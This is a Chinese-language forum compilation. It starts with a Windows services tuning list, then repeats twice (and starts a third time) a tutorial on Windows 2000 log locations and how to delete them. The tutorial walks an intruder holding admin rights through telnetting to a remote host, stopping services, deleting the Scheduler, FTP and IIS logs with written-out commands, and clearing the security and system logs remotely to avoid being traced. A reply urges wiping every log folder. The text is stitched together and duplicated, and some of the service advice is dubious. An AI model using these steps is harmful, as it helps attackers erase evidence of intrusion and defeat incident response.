　　　　基于事先设定的参数，从本机或远程计算机收集性能数据，然后将数据写入记录中。如果这个服务被停止，将不会收集性能信息。任何明确依存于它的服务将无法启动。 没什么价值的服务。 
　　　　建议：停用 
　　 
　　　　Plug and Play (即插即用) 
　　　　启用计算机以使用者没有或很少的输入来识别及适应硬件变更，停止或停用这个服务将导致系统不稳定。 顾名思义就是 PNP 环境，一般计算机中都需要PNP环境的支持，所以不要关闭。 
　　　　依存：Logical Disk Manager、Logical Disk Manager Administrative Service、Messenger、Smart Card、Telephony、Windows Audio 
　　　　建议：自动 
　　 
　　　　Portable Media Serial Number 
　　　　Retrieves the serial number of any portable music player connected to your computer透过联网计算机重新取得音乐拨放序号，这个东西没什么价值，别考虑关掉吧！ 
　　　　建议：停用 
　　 
　　　　Print Spooler (打印多任务缓冲处理器) 
　　　　将档案加载内存中以待稍后打印。可以优化打印，对于打印功能有一定的帮助，如果没有打印机，可以关了。 
　　　　依存：Remote Procedure Call (RPC) 
　　　　建议：停用 
　　 
　　　　Protected Storage (受保护的存放装置) 
　　　　提供受保护的存放区，来储存重要数据，防止未授权的服务、处理、或使用者进行存取。 用来储存你计算机上密码的服务，像 Outlook、拨号程序、其它应用程序等等 
　　　　依存：Remote Procedure Call (RPC) 
　　　　建议：自动 
　　 
　　　　QoS RSVP (QoS 许可控制，RSVP) 
　　　　提供网络讯号及区域流量控制安装功能给可识别 QoS 的程序和控制小程序项。用来保留 20% 带宽的服务，如果你的网卡不支持 802.1p 或在你计算机的网络上没有 ACS server ，那么不用多说，关了它。 
　　　　依存：AFD网络支持环境、TCP/IP Procotol Driver、Remote Procedure Call (RPC) 
　　　　建议：停用 

Remote Access Auto Connection Manager (远程访问自动联机管理员) 
　　　　当程序参照到远程 DNS 或 NetBIOS 名称或地址时，建立远程网络的联接。有些 DSL/Cable 供应商，可能需要用此来处理登入程序 
　　　　依存：Remote Access Connection Manager、Telephony 
　　　　建议：手动 
　　 
　　　　Remote Access Connection Manager (远程访问联接管理员) 
　　　　建立网络联接，顾名思义，在网络连接中占有很重要的意义，当然如果不使用网络，可以关闭。 
　　　　依存：Telephony、Internet Connection Firewall (ICF) / Internet Connection Sharing (ICS)、Remote Access Auto Connection Manager 
　　　　建议：手动 
　　 
　　　　Remote Desktop Help Session Manager 
　　　　管理并控制远程协助。如果此服务停止的话，远程协助将无法使用。停止此服务之前，请先参阅内容对话框中的 "依存性"标签。 如上说的管理和控制远程协助，对于普通用户来说，这个根本就用不着，可以关闭 
　　　　依存：Remote Procedure Call (RPC) 
　　　　建议：停用 
　　 
　　　　Remote Procedure Call (RPC) (远程过程调用，RPC) 
　　　　提供结束点对应程序以及其它 RPC 服务。 很多程序设备都需要用到该服务，很复杂的依存性，所以除非高级用户，否则别关闭。 
　　　　依存：太多了，本人限于篇幅不能一一枚举。 
　　　　建议：自动 
　　 
　　　　Remote Procedure Call (RPC) Locator (远程过程调用定位程序) 
　　　　管理 RPC 名称服务数据库。在一般计算机上很少用到，没什么特殊要求，可以尝试关了 
　　　　依存：Workstation 
　　　　建议：停用 
　　 
　　　　Remote Registry (远程登录服务) 
　　　　启用远程服务来对远程计算机进行操作。如果这个服务被停止，登录只能由这个计算机上的使用者修改。任何明确依存于它的服务将无法启动。 基于安全性的理由，如果没有特别的需求，建议最好关了它，除非你需要远程协助修改你的登录设定。 
　　　　依存：Remote Procedure Call (RPC) 
　　　　建议：停用 
　　 
　　　　Removable Storage (卸除式存放装置) 
　　　　除非你有 Zip 磁盘驱动器或是 USB 之类移动式的硬件或是 Tape 备份装置，不然可以尝试关了，现在的这方面的设备很多，建议保留 
　　　　依存：Remote Procedure Call (RPC) 
　　　　建议：自动 
　　 
　　　　Routing and Remote Access (路由和远程访问) 
　　　　提供连到局域网及广域网的公司的路由服务。提供拨号联机到网络或是 VPN 服务，一般用户用不到，可以关闭 
　　　　依存：Remote Procedure Call (RPC)、NetBIOSGroup 
　　　　建议：停用 
　　 
　　　　Secondary Logon 
　　　　启用在其它认证下的起始程序。如果这个服务被停止，这类的登入存取将无法使用。任何明确依存于它的服务将无法启动。允许多个用户处理程序，执行分身等 
　　　　建议：自动 
　　 
　　　　Security Accounts Manager (安全性账户管理员) 
　　　　储存本机账户的安全性信息。管理账号和群组原则(gpedit.msc)应用，虽然很多人不太了解它，但是作用不小。 
　　　　依存：Remote Procedure Call (RPC)、Distributed Transaction Coordinator 
　　　　建议：自动 
　　 
　　　　Server (服务器) 
　　　　透过网络为这台计算机提供档案、打印、及命名管道的共享。如果停止这个服务，将无法使用这些功能。所有依存于它的服务将无法启动。简单的说就是档案和打印的共享，除非你有和其它计算机共享，不然就关了 
　　　　依存：Computer Browser 
　　　　建议：停用 
　　 
　　　　Shell Hardware Detection 
　　　　为自动播放硬件事件提供通知。一般使用在移动存储或是CD装置、DVD装置上，这是个比较烦的东西，可以尝试关闭。 
　　　　依存：Remote Procedure Call (RPC) 
　　　　建议：停用 
　　 
　　Smart Card 
　　　　管理这个计算机所读取智能卡的存取。如果这个服务被停止，这个计算机将无法读取智能卡。任何明确依存于它的服务将无法启动。 如果你不使用 Smart Card ，那就可以关了 
　　　　依存：Plug and Play 
　　　　建议：停用 
　　 
　　　　Smart Card Helper (智能卡协助程序) 
　　　　启用对计算机使用的旧版非即插即用智能卡读取的支持。如果这个服务被停止，这个计算机将不支持旧版smart card。任何明确依存于它的服务将无法启动。 如果你不使用 Smart Card ，那就可以关了 
　　　　建议：停用 
　　 
　　　　SSDP Discovery Service 
　　　　在您的家用网络上启用通用即插即用设备的搜索。通用即插即用服务 (Universal Plug and Play, UPnP) 让计算机可以找到并使用网络上的装置，经由网络连接通过 TCP/IP 来搜索装置，像网络上的扫瞄器、数字相机或是打印机，都是使用 UPnP 的功能，基于安全性没用到的大可关了。不过现在数码设备很流行，需要的用户可以保留 
　　　　依存：Universal Plug and Play Device Host 
　　　　建议：停用 
　　 
　　　　System Event Notification (系统事件通知) 
　　　　追踪诸如 Windows 登入、网络、和电源事件的系统事件。通知这些事件的 COM+ 事件系统订阅者。对于服务器尤其重要。 
　　　　依存：COM+ Event System 
　　　　建议：自动 
　　 
　　　　System Restore Service 
　　　　执行系统还原功能。若要停止服务，从我的电脑--属性--系统还原 中关闭系统还原因人而定，本人觉得比较浪费资源，可以关掉。 
　　　　依存：Remote Procedure Call (RPC) 
　　　　建议：停用 
　　 
　　　　Task Scheduler 
　　　　让用户能够在这个计算机上设定自动的工作的计划，并执行。如果停止这个服务，这些工作在它们设定的时间时将不会执行。任何明确依存于它的服务将无法启动。设定自动的工作计划，像一些定时磁盘扫瞄、病毒定时扫瞄、更新等等，但是一般都很少用，可以关闭 
　　　　依存：Remote Procedure Call (RPC) 
　　　　建议：手动 
　　 
　　　　TCP/IP NetBIOS Helper (TCP/IP NetBIOS 协助程序) 
　　　　启用NetBIOS over TCP/IP (NetBT)]服务及NetBIOS名称解析的支持。如果你的网络不使用 NetBios或是WINS，你大可关闭，对于不太了解网络情况的用户建议保留，否则可能导致你的网络出现问题。 
　　　　依存：AFD 网络支持环境、NetBt 
　　　　建议：停用 
　　 
　　　　Telephony (电话语音) 
　　　　为本机及经由局域网络连接到正在执行此服务的服务器，控制电话语音装置和 IP 语音连接的服务，提供电话语音 API (TAPI) 支持。一般的拨号调制解调器或是一些 DSL/Cable 可能用到 
　　　　依存：Plug and Play、Remote Procedure Call (RPC)、Remote Access Connection Manager、Remote Access Auto Connection Manager 
　　　　建议：手动 
　　 
　　　　Telnet 
　　　　启用一个远程使用者来登入到这台计算机和执行应用程序，以及支持各种 TCP/IP Telnet 客户端，包含以UNIX为基本和以 Windows 为基本的计算机。如果服务停止了，远程使用者可能无法存取应用程序。任何明确地依存于这项服务的其它服务将会启动失败。允许远程用户用 Telnet 登入本计算机，一般人会误解关了就无法使用BBS，这其实和BBS无关，基于安全性的理由，如果没有特别的需求，建议最好关了 
　　　　依存：NT LM Security Support Provider、Remote Procedure Call (RPC)、TCP/IP Protocol Driver 
　　　　建议：停用 
　　 
　　　　Terminal Services (终端服务) 
　　　　允许多位使用者连接到同一部计算机、桌面及到远程计算机的应用程序。远程桌面的加强 (包含系统管理员的 RD)、快速切换使用者、远程协助和终端机服务器。远程桌面或是远程协助的功能，不需要就关了，目前该服务也导致了很多网络服务器的安全性问题。 
　　　　依存：Remote Procedure Call (RPC)、Fast User Switching Compatibility、InteractiveLogon 
　　　　建议：停用 
　　 
　　　　Themes 
　　　　提供使用者主题管理。 很多人使用布景主题，打造个性化的系统，不过如果没有使用的人，那就可以关闭。 
　　　　建议：自动 
　　 
　　　　Uninterruptible Power Supply (不断电供电系统) 
　　　　管理连接到这台计算机的不间断电源供应 (UPS)。不间断电源供应 (UPS)一般人有用到吗？除非你的电源供应器有具备此功能，不然就关了 
　　　　建议：停用 
　　 
　　　　Universal Plug and Play Device Host 
　　　　提供主机通用即插即用装置的支持。用来侦测安装通用即插即用服务 (Universal Plug and Play, UPnP)装置，像是数字相机或打印机，现在很多设备都需要这个。 
　　　　依存：SSDP Discovery Service 
　　　　建议：自动 
　　 
　　Volume Shadow Copy 
　　　　管理及执行用于备份和其它目的的磁盘镜像复制。如果这个服务被停止，镜像复制将无法用于备份，备份可能会失败。任何明确依存于它的服务将无法启动。如上所说的，用来备份的东西，如 MS Backup 程序就需要这个服务 
　　　　依存：Remote Procedure Call (RPC) 
　　　　建议：停用 
　　 
　　　　WebClient 
　　　　启用 Windows 为主的程序来建立、存取，以及修改因特网为主的文件。如果停止这个服务，这些功能将无法使用。任何明确依存于它的服务将无法启动。使用 WebDAV 将档案或文件上载到所有的 Web 服务，基于安全性的理由，你可以尝试关闭 
　　　　依存：WebDav Client Redirector 
　　　　建议：停用 
　　 
　　　　Windows Audio 
　　　　管理用于 Windows 为主程序的音讯装置。如果这个服务被停止，音讯装置和效果将无法正常运作。任何明确依存于它的服务将无法启动。如果你没有声卡可以关了他，但是现在的个人电脑不会没有声卡吧？ 
　　　　依存：Plug and Play、Remote Procedure Call (RPC) 
　　　　建议：自动 
　　 
　　　　Windows Image Acquisition (WIA) (Windows影像取得程序) 
　　　　为扫描仪和数码相机提供影像采集服务。如果扫描仪和数字相机内部具有支持WIA功能的话，那就可以直接看到图档，不需要其它的驱动程序，所以没有扫描仪和数字相机的使用者大可关了 
　　　　依存：Remote Procedure Call (RPC) 
　　　　建议：停用 
　　 
　　　　Windows Installer (Windows 安装程序) 
　　　　根据包含在 .MSI 档案内的指示来安装，修复以及移除软件。是一个系统服务，协助使用者正确地安装、设定、追踪、升级和移除软件程序，可管理应用程序建立和安装的标准格式，并且追踪例如档案群组、登录项目及快捷方式等组件，很多软件的安装都需要用到这个服务，所以建议保留，否则会遇到很多麻烦的。 
　　　　依存：Remote Procedure Call (RPC) 
　　　　建议：自动 
　　 
　　　　Windows Management Instrumentation (WMI) 
　　　　提供公用接口及对象模型，以存取有关操作系统、设备、应用程序及服务的管理信息。如果这个服务已停止，大多数的 Windows 软件将无法正常运作。所有依存于它的服务都将无法启动。 如上说的，是一种提供一个标准的基础结构来监视和管理系统资源的服务，由不得你动他 
　　　　依存：Event Log、Remote Procedure Call (RPC) 
　　　　建议：自动 
　　 
　　　　Windows Management Instrumentation Driver Extensions (Windows Management Instrumentation 驱动程序延伸) 提供系统管理信息管理驱动程序。Windows Management Instrumentation 的延伸，提供信息用的，可以设置为手动 
　　　　建议：手动 
　　 
　　　　Windows Time (Windows 时间设定) 
　　　　维护在网络上所有客户端及服务器的数据及时间同步处理。如果这个服务停止，将无法进行日期及时间同步处理。所有依存的服务都会停止。 网络对时校准没有太大的意义，而且占有不少的资源，可以关闭 
　　　　建议：停用 
　　 
　　　　Wireless Zero Configuration 
　　　　为 802.11 适配卡提供自动设定 自动配置无线网络装置，言下之意就是说，除非你有在使用无线网络装置，那么你才有必要使用这个网络零管理服务，否则这个对你一点作用也没有。 
　　　　依存：NDIS Usermode I/O Protocol、Remote Procedure Call (RPC) 
　　　　建议：停用 
　　 
　　　　WMI Performance Adapter 
　　　　提供来自 WMIHiPerf 提供者的效能链接库信息。对大多数用户没有太大作用 
　　　　依存：Remote Procedure Call (RPC) 
　　　　建议：停用 
　　 
　　　　Workstation (工作站) 
　　　　建立并维护到远程服务器的客户端网络联机。如果停止这个服务，这些联机将无法使用。所有依存于它的服务将无法启动。是网络连接中所必要的一些功能 
　　　　依存：Alerter、Background Intelligent Transfer Service、Computer Browser、Messenger、Net Logon、Remote Procedure Call (RPC) Locator 
　　　　建议：自动 

-----------------------------------
　　 
　　　　Windows中很多服务都是用不上的，大家可以根据自己的需求，自己去决定保留哪些，关闭哪些，相信经过你的修改，系统资源会大大增加。



【Windows2000日志详述及删除方法】
Windows2000的日志文件通常有应用程序日志，安全日志、系统日志、DNS服务器日志、FTP日志、WWW日 
志等等，可能会根据服务器所开启的服务不同。当我们用流光探测时，比如说IPC探测，就会在安全日志 
里迅速地记下流光探测时所用的用户名、时间等等，用FTP探测后，也会立刻在FTP日志中记下IP、时间、 
探测所用的用户名和密码等等。甚至连流影启动时需要msvcp60.dll这个动库链接库，如果服务器没有这 
个文件都会在日志里记录下来，这就是为什么不要拿国内主机探测的原因了，他们记下你的IP后会很容易 
地找到你，只要他想找你！！还有Scheduler日志这也是个重要的LOG，你应该知道经常使用的srv.exe就 
是通过这个服务来启动的，其记录着所有由Scheduler服务启动的所有行为，如服务的启动和停止。 
日志文件默认位置： 

应用程序日志、安全日志、系统日志、DNS日志默认位置：%systemroot%\system32\config，默认文件大 
小512KB，管理员都会改变这个默认大小。 

安全日志文件：%systemroot%\system32\config\SecEvent.EVT 
系统日志文件：%systemroot%\system32\config\SysEvent.EVT 
应用程序日志文件：%systemroot%\system32\config\AppEvent.EVT 
Internet信息服务FTP日志默认位置：%systemroot%\system32\logfiles\msftpsvc1\，默认每天一个日志 
Internet信息服务WWW日志默认位置：%systemroot%\system32\logfiles\w3svc1\，默认每天一个日志 
Scheduler服务日志默认位置：%systemroot%\schedlgu.txt 
以上日志在注册表里的键： 
应用程序日志，安全日志，系统日志，DNS服务器日志，它们这些LOG文件在注册表中的： 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Eventlog 
有的管理员很可能将这些日志重定位。其中EVENTLOG下面有很多的子表，里面可查到以上日志的定位目录。 
Schedluler服务日志在注册表中 
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SchedulingAgent 

FTP和WWW日志详解： 
FTP日志和WWW日志默认情况，每天生成一个日志文件，包含了该日的一切记录，文件名通常为ex（年份）（月份）（日期），例如ex001023，就是2000年10月23日产生的日志，用记事本就可直接打开，如下例： 
#Software: Microsoft Internet Information Services 5.0　　（微软IIS5.0） 
#Version: 1.0 （版本1.0） 
#Date: 20001023 0315 （服务启动时间日期） 
#Fields: time cip csmethod csuristem scstatus 
0315 127.0.0.1 [1]USER administator 331　（IP地址为127.0.0.1用户名为administator试图登录） 
0318 127.0.0.1 [1]PASS C 530　（登录失败） 
032:04 127.0.0.1 [1]USER nt 331　（IP地址为127.0.0.1用户名为nt的用户试图登录） 
032:06 127.0.0.1 [1]PASS C 530　（登录失败） 
032:09 127.0.0.1 [1]USER cyz 331　（IP地址为127.0.0.1用户名为cyz的用户试图登录） 
0322 127.0.0.1 [1]PASS C 530　（登录失败） 
0322 127.0.0.1 [1]USER administrator 331　（IP地址为127.0.0.1用户名为administrator试图登录） 
0324 127.0.0.1 [1]PASS C 230　（登录成功） 
0321 127.0.0.1 [1]MKD nt 550　（新建目录失败） 
0325 127.0.0.1 [1]QUIT C 550　（退出FTP程序） 

从日志里就能看出IP地址为127.0.0.1的用户一直试图登录系统，换了四次用户名和密码才成功，管理员 
立即就可以得知管理员的入侵时间、IP地址以及探测的用户名，如上例入侵者最终是用administrator用 
户名进入的，那么就要考虑更换此用户名的密码，或者重命名administrator用户。 
WWW日志 
WWW服务同FTP服务一样，产生的日志也是在%systemroot%\System32\LogFiles\W3SVC1目录下，默认是每 
天一个日志文件，下面是一个典型的WWW日志文件 
#Software: Microsoft Internet Information Services 5.0 
#Version: 1.0 
#Date: 20001023 03:091 
#Fields: date time cip csusername sip sport csmethod csuristem csuriquery scstatus cs(UserAgent) 
20001023 03:091 192.168.1.26 192.168.1.37 80 GET /iisstart.asp 200 Mozilla/4.0+(compatible;+MSIE+5.0;+Windows+98;+DigExt) 
20001023 03:094 192.168.1.26 192.168.1.37 80 GET /pagerror.gif 200 Mozilla/4.0+(compatible;+MSIE+5.0;+Windows+98;+DigExt) 
通过分析第六行，可以看出2000年10月23日，IP地址为192.168.1.26的用户通过访问IP地址 
为192.168.1.37机器的80端口，查看了一个页面iisstart.asp,这位用户的浏览器为compatible;+MSIE+5.0;+Windows+98+DigExt，有 
经验的管理员就可通过安全日志、FTP日志和WWW日志来确定入侵者的IP地址以及入侵时间。 
既使你删掉FTP和WWW日志，但是还是会在系统日志和安全日志里记录下来，但是较好的是只显示了你的 
机器名，并没有你的IP，例如上面几个探测之后，系统日志将会产生下面的记录： 
一眼就能看出2000年10月23日，16点17分，系统因为某些事件出现警告，双击头一个，打开它的属性： 

属性里记录了出现警告的原因，是因为有人试图用administator用户名登录，出现一个错误，来源 
是FTP服务。 
同时安全记录里写将同时记下：（Ekin:此图不是此次示例的安全日志） 


在上图中可以看到两种图标：钥匙（表示成功）和锁（表示当用户在做什么时被系统停止）。接连四个 
锁图标，表示四次失败审核，事件类型是帐户登录和登录、注销失败，日期为2000年10月18日，时间为 
1002，这就需要重点观察。 
双点第一个失败审核事件的，即得到此事件的详细描述，如下图12所示： 

分析上图，我们可以得知有个CYZ的工作站，用administator用户名登录本机，但是因为用户名未知或密 
码错误（实际为密码错误）未能成功。 
另外还有DNS服务器日志，不太重要，就此略过（其实是我没有看过它） 

知道了Windows2000日志的详细情况，下面就要学会怎样删除这些日志： 
通过上面，得知日志文件通常有某项服务在后台保护，除了系统日志、安全日志、应用程序日志等等， 
它们的服务是Windos2000的关键进程，而且与注册表文件在一块，当Windows2000启动后，启动服务来保 
护这些文件，所以很难删除，而FTP日志和WWW日志以及Scedlgu日志都是可以轻易地删除的。 
首先要取得Admnistrator密码或Administrators组成员之一，然后Telnet到远程主机，先来试着删除FTP 
日志： 
D:\SERVER>del schedlgu.txt 
D:\SERVER\SchedLgU.Txt 
进程无法访问文件，因为另一个程序正在使用此文件。 
说过了，后台有服务保护，先把服务停掉！ 
D:\SERVER>net stop "task scheduler" 
下面的服务依赖于 Task Scheduler 服务。 
停止 Task Scheduler 服务也会停止这些服务。 

Remote Storage Engine 

是否继续此操作? (Y/N) [N]: y 
Remote Storage Engine 服务正在停止.... 
Remote Storage Engine 服务已成功停止。 

Task Scheduler 服务正在停止. 
Task Scheduler 服务已成功停止。 
OK，它的服务停掉了，同时也停掉了与它有依赖关系的服务。再来试着删一下！ 
D:\SERVER>del schedlgu.txt 
D:\SERVER> 
没有反应？成功了！下一个是FTP日志和WWW日志，原理都是一样，先停掉相关服务，然后再删日志！ 
D:\SERVER\system32\LogFiles\MSFTPSVC1>del ex*.log 

D:\SERVER\system32\LogFiles\MSFTPSVC1> 
以上操作成功删除FTP日志！再来WWW日志！ 
D:\SERVER\system32\LogFiles\W3SVC1>del ex*.log 

D:\SERVER\system32\LogFiles\W3SVC1> 
OK！恭喜，现在简单的日志都已成功删除。下面就是很难的安全日志和系统日志了，守护这些日志的服 
务是Event Log，试着停掉它！ 
D:\SERVER\system32\LogFiles\W3SVC1>net stop eventlog 
这项服务无法接受请求的 "暂停" 或 "停止" 操作。 
KAO，I　服了 U，没办法，它是关键服务。如果不用第三方工具，在命令行上根本没有删除安全日志和系 
统日志的可能！所以还是得用虽然简单但是速度慢得死机的办法：打开“控制面板”的“管理工具”中的 
“事件查看器”（98没有，知道用Win2k的好处了吧），在菜单的“操作”项有一个名为“连接到另一台 
计算机”的菜单，点击它如下图所示： 

输入远程计算机的IP，然后点支烟，等上数十分钟，忍受象死机的折磨，然后打开下图： 

选择远程计算机的安全性日志，右键选择它的属性： 

点击属性里的“清除日志”按钮，OK！安全日志清除完毕！同样的忍受痛苦去清除系统日志！ 
目前在不借助第三工具的情况下，能很快，很顺利地清除FTP、WWW还有Schedlgu日志，就是系统日志和 
安全日志属于Windows2000的严密守护，只能用本地的事件查看器来打开它，因为在图形界面下，加之网 
速又慢，如果你银子多，时间闲，还是可以清除它的。综上所述，介绍了Windows2000的日志文件以及删 
除方法，但是你必须是Administrator，注意必须作为管理员或管理组的成员登录才能打开安全日志记 
录。该过程适用于 Windows 2000 Professional 计算机，也适用于作为独立服务器或成员服务器运行的 
Windows 2000 Server 计算机。 

至此，Windows2000安全知识基础讲座完毕，还有几句话要讲，大家也看出来了，虽然FTP等等日志可以很 
快清除，但是系统日志和安全日志却不是那么快、那么顺利地能删除，如果遇到聪明的管理员，将日志文 
件转移到另一个地方，那更是难上加难，所以奉劝大家，千万不要拿国内的主机做试验，国内的法律很严 
呀！今天吃饭时，听说有两个人开玩笑，一个人把另外一个人的东西藏起来了，结果那个人一急，报案了 
，于是藏东西那个人被判四年刑！！法官说法律是不开玩笑的！！！所以大家一定要牢记这点！(不要说 
我老生常谈) 
如果大家有什么不明白地方，请在光和影子论坛提问！谢谢！ 

从日志里就能看出IP地址为127.0.0.1的用户一直试图登录系统，换了四次用户名和密码才成功，管理员 
立即就可以得知管理员的入侵时间、IP地址以及探测的用户名，如上例入侵者最终是用administrator用 
户名进入的，那么就要考虑更换此用户名的密码，或者重命名administrator用户。 
WWW日志 
WWW服务同FTP服务一样，产生的日志也是在%systemroot%\System32\LogFiles\W3SVC1目录下，默认是每 
天一个日志文件，下面是一个典型的WWW日志文件 
#Software: Microsoft Internet Information Services 5.0 
#Version: 1.0 
#Date: 20001023 03:091 
#Fields: date time cip csusername sip sport csmethod csuristem csuriquery scstatus cs(UserAgent) 
20001023 03:091 192.168.1.26 192.168.1.37 80 GET /iisstart.asp 200 Mozilla/4.0+(compatible;+MSIE+5.0;+Windows+98;+DigExt) 
20001023 03:094 192.168.1.26 192.168.1.37 80 GET /pagerror.gif 200 Mozilla/4.0+(compatible;+MSIE+5.0;+Windows+98;+DigExt) 
通过分析第六行，可以看出2000年10月23日，IP地址为192.168.1.26的用户通过访问IP地址 
为192.168.1.37机器的80端口，查看了一个页面iisstart.asp,这位用户的浏览器为compatible;+MSIE+5.0;+Windows+98+DigExt，有 
经验的管理员就可通过安全日志、FTP日志和WWW日志来确定入侵者的IP地址以及入侵时间。 
既使你删掉FTP和WWW日志，但是还是会在系统日志和安全日志里记录下来，但是较好的是只显示了你的机 
器名，并没有你的IP，例如上面几个探测之后，系统日志将会产生下面的记录： 
一眼就能看出2000年10月23日，16点17分，系统因为某些事件出现警告，双击头一个，打开它的属性： 

属性里记录了出现警告的原因，是因为有人试图用administator用户名登录，出现一个错误，来源是FTP 
服务。 
同时安全记录里写将同时记下：（Ekin:此图不是此次示例的安全日志） 

在上图中可以看到两种图标：钥匙（表示成功）和锁（表示当用户在做什么时被系统停止）。接连四个锁图标，表示四次失败审核，事件类型是帐户登录和登录、注销失败，日期为2000年10月18日，时间为1002，这就需要重点观察。 
双点第一个失败审核事件的，即得到此事件的详细描述，如下图12所示： 
分析上图，我们可以得知有个CYZ的工作站，用administator用户名登录本机，但是因为用户名未知或密码错误（实际为密码错误）未能成功。 
另外还有DNS服务器日志，不太重要，就此略过（其实是我没有看过它） 

知道了Windows2000日志的详细情况，下面就要学会怎样删除这些日志： 
通过上面，得知日志文件通常有某项服务在后台保护，除了系统日志、安全日志、应用程序日志等等，它们的服务是Windos2000的关键进程，而且与注册表文件在一块，当Windows2000启动后，启动服务来保护这些文件，所以很难删除，而FTP日志和WWW日志以及Scedlgu日志都是可以轻易地删除的。 
首先要取得Admnistrator密码或Administrators组成员之一，然后Telnet到远程主机，先来试着删除FTP日志： 
D:\SERVER>del schedlgu.txt 
D:\SERVER\SchedLgU.Txt 
进程无法访问文件，因为另一个程序正在使用此文件。 
说过了，后台有服务保护，先把服务停掉！ 
D:\SERVER>net stop "task scheduler" 
下面的服务依赖于 Task Scheduler 服务。 
停止 Task Scheduler 服务也会停止这些服务。 

Remote Storage Engine 

是否继续此操作? (Y/N) [N]: y 
Remote Storage Engine 服务正在停止.... 
Remote Storage Engine 服务已成功停止。 

Task Scheduler 服务正在停止. 
Task Scheduler 服务已成功停止。 
OK，它的服务停掉了，同时也停掉了与它有依赖关系的服务。再来试着删一下！ 
D:\SERVER>del schedlgu.txt 
D:\SERVER> 
没有反应？成功了！下一个是FTP日志和WWW日志，原理都是一样，先停掉相关服务，然后再删日志！ 
D:\SERVER\system32\LogFiles\MSFTPSVC1>del ex*.log 

D:\SERVER\system32\LogFiles\MSFTPSVC1> 
以上操作成功删除FTP日志！再来WWW日志！ 
D:\SERVER\system32\LogFiles\W3SVC1>del ex*.log 

D:\SERVER\system32\LogFiles\W3SVC1> 
OK！恭喜，现在简单的日志都已成功删除。下面就是很难的安全日志和系统日志了，守护这些日志的服务 
是Event Log，试着停掉它！ 
D:\SERVER\system32\LogFiles\W3SVC1>net stop eventlog 
这项服务无法接受请求的 "暂停" 或 "停止" 操作。 
KAO，I　服了 U，没办法，它是关键服务。如果不用第三方工具，在命令行上根本没有删除安全日志和系 
统日志的可能！所以还是得用虽然简单但是速度慢得死机的办法：打开“控制面板”的“管理工具”中的 
“事件查看器”（98没有，知道用Win2k的好处了吧），在菜单的“操作”项有一个名为“连接到另一台 
计算机”的菜单，点击它如下图所示： 

输入远程计算机的IP，然后点支烟，等上数十分钟，忍受象死机的折磨，然后打开下图： 

选择远程计算机的安全性日志，右键选择它的属性： 

点击属性里的“清除日志”按钮，OK！安全日志清除完毕！同样的忍受痛苦去清除系统日志！ 
目前在不借助第三工具的情况下，能很快，很顺利地清除FTP、WWW还有Schedlgu日志，就是系统日志和安 
全日志属于Windows2000的严密守护，只能用本地的事件查看器来打开它，因为在图形界面下，加之网速 
又慢，如果你银子多，时间闲，还是可以清除它的。综上所述，介绍了Windows2000的日志文件以及删除 
方法，但是你必须是Administrator，注意必须作为管理员或管理组的成员登录才能打开安全日志记录。 
该过程适用于 Windows 2000 Professional 计算机，也适用于作为独立服务器或成员服务器运行的 Win 
dows 2000 Server 计算机。 

至此，Windows2000安全知识基础讲座完毕，还有几句话要讲，大家也看出来了，虽然FTP等等日志可以很 
快清除，但是系统日志和安全日志却不是那么快、那么顺利地能删除，如果遇到聪明的管理员，将日志 
文件转移到另一个地方，那更是难上加难，所以奉劝大家，千万不要拿国内的主机做试验，国内的法律很 
严呀！今天吃饭时，听说有两个人开玩笑，一个人把另外一个人的东西藏起来了，结果那个人一急，报 
案了，于是藏东西那个人被判四年刑！！法官说法律是不开玩笑的！！！所以大家一定要牢记这点！(不 
要说我老生常谈) 
_______________________________________________________________________________
全是很全，不过大家都忽略了一个问题！ 
如果一个服务器下管理有多个HTTP或FTP站点的话，日志的，命名方法就不一样了！会出 
现W3SVC1，2，3....而这其中，又有一个是默认的远程网络管理日志（默认端口6959，如果开着这 
个……呵呵，很大的一个漏洞！当然要有administrator权限……），所以要想判断一台服务器的具 
体日志情况，我个人建议……要抹就抹个干净……只要是在logfile下的文件夹，全部删掉 


【Windows2000的日志文件详述及删除方法】
Windows2000的日志文件详述及删除方法 
                                                 
     Windows2000的日志文件通常有应用程序日志，安全日志、系统日志、DNS服务器日志、FTP日志、WWW日志等等，可能会根据服务器所开启的服务不同。当我们用流光探测时，比如说IPC探测，就会在安全日志里迅速地记下流光探测时所用的用户名、时间等等，用FTP探测后，也会立刻在FTP日志中记下IP、时间、探测所用的用户名和密码等等。甚至连流影启动时需要msvcp60.dll这个动库链接库，如果服务器没有这个文件都会在日志里记录下来，这就是为什么不要拿国内主机探测的原因了，他们记下你的IP后会很容易地找到你，只要他想找你！！还有Scheduler日志这也是个重要的LOG，你应该知道经常使用的srv.exe就是通过这个服务来启动的，其记录着所有由Scheduler服务启动的所有行为，如服务的启动和停止。 
日志文件默认位置：
应用程序日志、安全日志、系统日志、DNS日志默认位置：%sys temroot%\sys tem32\config，默认文件大小512KB，管理员都会改变这个默认大小。
安全日志文件：%sys temroot%\sys tem32\config\SecEvent.EVT
系统日志文件：%sys temroot%\sys tem32\config\SysEvent.EVT
应用程序日志文件：%sys temroot%\sys tem32\config\AppEvent.EVT
Internet信息服务FTP日志默认位置：%sys temroot%\sys tem32\logfiles\msftpsvc1\，默认每天一个日志
Internet信息服务WWW日志默认位置：%sys temroot%\sys tem32\logfiles\w3svc1\，默认每天一个日志
Scheduler服务日志默认位置：%sys temroot%\schedlgu.txt

以上日志在注册表里的键：
应用程序日志，安全日志，系统日志，DNS服务器日志，它们这些LOG文件在注册表中的：
HKEY_LOCAL_MACHINE\sys tem\CurrentControlSet\Services\Eventlog
有的管理员很可能将这些日志重定位。其中EVENTLOG下面有很多的子表，里面可查到以上日志的定位目录。
Schedluler服务日志在注册表中
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SchedulingAgent

FTP和WWW日志详解：
FTP日志和WWW日志默认情况，每天生成一个日志文件，包含了该日的一切记录，文件名通常为ex（年份）（月份）（日期），例如ex001023，就是2000年10月23日产生的日志，用记事本就可直接打开，如下例：
#Software: Microsoft Internet Information Services 5.0　　（微软IIS5.0）
#Version: 1.0 （版本1.0）
#Date: 20001023 0315 （服务启动时间日期）
#Fields: time cip csmethod csuristem scstatus
0315 127.0.0.1 [1]USER administator 331　（IP地址为127.0.0.1用户名为administator试图登录）
0318 127.0.0.1 [1]PASS C 530　（登录失败）
032:04 127.0.0.1 [1]USER nt 331　（IP地址为127.0.0.1用户名为nt的用户试图登录）
032:06 127.0.0.1 [1]PASS C 530　（登录失败）
